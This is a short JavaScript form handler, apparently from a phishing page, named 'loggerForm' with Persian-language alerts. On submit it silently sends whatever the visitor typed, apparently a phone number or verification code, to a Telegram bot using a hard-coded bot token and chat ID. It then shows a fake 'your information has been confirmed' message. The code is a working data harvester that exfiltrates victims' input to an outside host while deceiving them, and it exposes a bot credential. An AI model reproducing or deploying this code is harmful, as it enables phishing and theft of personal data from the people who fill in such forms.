document.getElementById("loggerForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission
  
    var data = document.getElementById("data").value; // Get the data from the input field
  
    // Send the data to the Telegram bot using the fetch API
    fetch("https://api.telegram.org/bot6778397606:AAGfHwjSZWkUe2h_btuR0046v_gorqpTT0U/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "6685997204",
        text: data
      })
    })
    .then(function(response) {
      if (response.ok) {
        alert("اطلاعات شما تایید شد لطفا منتظر بمانید");
      } else {
        alert(" لطفا شماره خود را صحیح وارد کنید 🙏 ");
      }
    })
    .catch(function(error) {
      console.error("An error occurred:", error);
    });
  });